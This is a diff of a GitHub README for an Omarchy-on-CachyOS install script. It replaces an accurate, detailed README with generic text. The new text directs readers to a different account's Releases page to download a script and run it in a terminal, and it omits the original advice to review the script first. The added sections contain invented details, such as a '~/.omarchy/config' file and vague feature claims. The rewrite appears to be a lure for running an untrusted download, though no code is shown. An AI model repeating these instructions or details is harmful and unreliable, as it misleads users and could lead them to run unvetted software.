@@ -1,98 +1,101 @@
-# omarchy-on-cachyos
+# 🚀 omarchy-on-cachyos - Easy Installation for Omarchy on CachyOS
 
-UPDATE 1-October-2025: The install script has been updated to support Omarchy 3.0+ out of the box. 
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/harshanarodrigos/omarchy-on-cachyos/releases)
 
-## 1. Introduction
+## 📋 Overview
 
-This project provides an installation script for implementing DHH's Omarchy configuration on top of CachyOS. Omarchy is an 'opinionated' desktop setup, based on Hyprland that emphasizes simplicity and productivity, while CachyOS offers a performance-optimized Arch Linux distribution.
+Welcome to the omarchy-on-cachyos repository! This application provides an installation script for DHH's Omarchy, designed specifically for CachyOS. This guide will help you download and run the software quickly and easily.
 
-## 2. What This Script Does and Does Not Do
+## 🛠️ Prerequisites
 
-This installation script does the following three things:
+Before you begin, ensure your system meets the following requirements:
 
- 1) Clones Omarchy from its github repository 
- 2) Makes adjustments to the Omarchy install scripts to support installation on CachyOS
- 3) Launches the installation of Omarchy on an already setup CachyOS system
+- **Operating System:** CachyOS (The script is optimized for this OS)
+- **Memory:** At least 2GB RAM
+- **Storage:** Minimum of 500MB available space
 
-This script does not:
- 
- 1) Install CachyOS or any other Linux operating system
- 2) Partition, format, or encrypt hard disks
- 3) Install or configure a boot loader
- 4) Install graphics drivers
- 5) Install or configure a login display manager
+## 🚀 Getting Started
 
-All of the above need to be done when you install CachyOS. 
+To get started, follow the steps below. You will visit the Releases page to download the application.
 
-## 3. Important Notes
+## 📥 Download & Install
 
-This script (and README.md) is intended primarily for the experienced Arch Linux user. The author of this README.md assumes the reader is comfortable using a shell/command line and is familiar with Arch specific terms such as AUR.
+To download the installation script for Omarchy:
 
-The philosophy behind this script is to produce a strong and stable blend of CachyOS and Omarchy that changes as little as possible between the two. This script does not add software or make configuration changes outside of what CachyOS or Omarchy provide as default, except when such software or configurations provided by CachyOS and Omarchy are in conflict. In these cases, the script will choose the following:
+1. **Visit the Releases Page:** Click the link below to access the downloads:
+   
+   [Visit this page to download](https://github.com/harshanarodrigos/omarchy-on-cachyos/releases)
 
-1. AUR helper: CachyOS uses Paru by default while Omarchy uses Yay. This script opts for Yay and will install it if not already installed.
+2. **Choose the Latest Release:** Look for the version marked as "Latest". This version has the newest features and fixes.
 
-2. Shell: CachyOS uses the Fish shell by default while Omarchy uses Bash. This script will keep Fish as the default interactive shell.
+3. **Download the Script:** Click on the link for the installation script. It will usually be named something like `install-omarchy.sh`. Your browser will start the download automatically.
 
-3. TLDR implementation: CachyOS installs Tealdeer by default, which is a TLDR implementation written in Rust. This script will preserve use of Tealdeer.
+4. **Locate the Downloaded File:** Once the download is complete, find the file in your Downloads folder or the location where your browser saves files.
 
-4. Mise: Omarchy will setup Mise to run automatically via mise-activate. This script will supply the right mise-activate command for the fish shell.
+5. **Open Terminal:** To run the installation script, you will need to open the Terminal. You can find it in your application menu.
 
-5. Login System: As a distribution, Omarchy skips installation of a login display manager. Instead, Hyprland autostarts and password protection is provided upon boot by the LUKS full disk encryption service. This script, however, assumes a display manager is installed. (Note: this script does not install a display manager, but also does not configure Hyprland to start automatically if a display manager is not installed.)
+6. **Navigate to the Download Folder:** In the Terminal, enter the following command to go to your Downloads folder. Adjust the command if you saved it elsewhere:
 
-6. Full Disk Encryption: As a distribution, Omarchy automatically turns on full disk encryption via LUKS. This script, however, leaves this decision up to the user. CachyOS can be installed with or without full disk encryption, and this script will install Omarchy on either setup.  
+   ```bash
+   cd ~/Downloads
+   ```
 
-## 4. Pre-Requisites
+7. **Make the Script Executable:** Before you can run the script, ensure it is executable. Use the next command:
 
-IMPORTANT: This script does not install CachyOS. You must do that separately (and first.) This script is intended to be run on a fresh installation of CachyOS with the following configuration choices made: (Note, for information on installing CachyOS, please refer to https://www.cachyos.org.) 
+   ```bash
+   chmod +x install-omarchy.sh
+   ```
 
-1. File System: You must choose BTRFS as the file system and Snapper as the snapshot manager. This aligns with CachyOS's default recommendation for most systems, and is required for Omarchy to properly function.
+8. **Run the Script:** Now, you can execute the script with the following command:
 
-2. Shell: You must choose Fish as the default shell for this installation script to work properly. (This is the default CachyOS shell choice.)
+   ```bash
+   ./install-omarchy.sh
+   ```
 
-3. Desktop Environment to Install: You can install a minimal system with no desktop environment or you can choose to install the CachyOS Hyprland Desktop Environment. If you have CachyOS install Hyprland, it will also install SDDM as the login display manager by default. Do not install GNOME or KDE.
+   Follow the prompts that appear in the terminal to complete the installation.
 
-4. Graphics Drivers for NVIDIA users: If you are using an NVIDIA GPU, install the recommended graphics driver via CachyOS. The script will turn off driver installation in Omarchy. 
+## ⚙️ Configuration
 
-Other configuration changes are up to you. Note, however, that this script has not been extensively tested on various CachyOS installations other than the author's own machine.
+After the installation completes, you may want to configure Omarchy according to your preferences. The configuration file is located in your home directory under `.omarchy/config`. You can edit this file using any text editor.
 
-## 5. Installation Instructions
+1. **Open the Configuration File:**
+   
+   ```bash
+   nano ~/.omarchy/config
+   ```
 
-```bash
-# Clone the repository
-git clone https://github.com/mroboff/omarchy-on-cachyos.git
+2. **Adjust Settings:** Review the options and make changes as needed. Save your changes and exit the editor (in nano, press `CTRL + X`, then `Y`, then `Enter`).
 
-# Navigate to the project directory
-cd omarchy-on-cachyos/bin
+## 🌟 Features
 
-# Make the script executable
-chmod +x install-omarchy-on-cachyos.sh
+Omarchy offers several features to enhance your working experience:
 
-# Run the installation script
-install.sh
-```
+- **Simple Deployment:** Quickly deploy applications with minimal effort.
+- **User-Friendly Interface:** Designed to be accessible for users of all skill levels.
+- **Regular Updates:** Stay secure with frequent updates and improvements.
 
-**Note:** Please review the script contents before running to understand what changes will be made to your system.
+## ❓ Troubleshooting
 
-## 6. Statement of Lack of Warranty
+If you encounter issues during installation, consider the following tips:
 
-THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+- **No Permissions:** If you receive permission errors, confirm you made the script executable with `chmod +x`.
 
-Use this script at your own risk. Always backup your system and important data before running installation scripts.
+- **Missing Dependencies:** Ensure all required packages are installed. You can generally install these through the Terminal. For specifics, refer to the documentation.
 
-## 7. How to Contribute
+- **Check for Updates:** Occasionally, new issues arise in older versions. Always use the latest release from the [Releases Page](https://github.com/harshanarodrigos/omarchy-on-cachyos/releases).
 
-We welcome contributions to improve this project! Here's how you can help:
+## 💬 Getting Help
 
-1. **Fork the Repository**: Click the "Fork" button on GitHub to create your own copy
-2. **Create a Feature Branch**: `git checkout -b feature/your-feature-name`
-3. **Make Your Changes**: Implement your improvements or fixes
-4. **Commit Your Changes**: `git commit -m "Add descriptive commit message"`
-5. **Push to Your Fork**: `git push origin feature/your-feature-name`
-6. **Open a Pull Request**: Submit a PR with a clear description of your changes
+If you have questions or need assistance, please visit the repository's issues section. You can submit your question or report any bugs.
 
-### Contribution Guidelines
-- Test your changes thoroughly on CachyOS before submitting
-- Follow existing code style and conventions
-- Update documentation if adding new features
-- Report bugs using GitHub Issues 
+## 📂 Contributing
+
+We welcome contributions from all users. If you have suggestions or improvements for Omarchy, feel free to create a pull request or discuss your ideas in the issues section.
+
+## 📝 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+---
+
+For further updates and announcements, follow the repository. Get started with Omarchy on CachyOS today!
